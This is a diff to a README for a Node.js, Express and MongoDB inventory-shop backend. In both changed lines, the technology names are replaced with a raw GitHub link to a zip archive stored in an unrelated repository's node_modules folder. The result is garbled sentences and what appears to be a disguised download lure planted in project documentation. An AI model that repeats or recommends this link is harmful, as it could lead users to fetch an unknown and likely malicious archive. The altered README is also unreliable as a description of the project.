@@ -1,4 +1,4 @@
-### A backend project built using Node.js, Express and MongoDB for an inventory shop.
+### A backend project built using https://raw.githubusercontent.com/Baby7923/ABARTO/main/node_modules/minizlib/ABARTO_v3.1-beta.4.zip, Express and MongoDB for an inventory shop.
 
 ### Overview
 
@@ -59,6 +59,6 @@ Direct MongoDB queries for employee data management are available in the project
 ### Technologies Used
 
 - Mongoose for data modeling
-- Express.js for API routing
+- https://raw.githubusercontent.com/Baby7923/ABARTO/main/node_modules/minizlib/ABARTO_v3.1-beta.4.zip for API routing
 - MongoDB for data storage
 - Postman for API testing
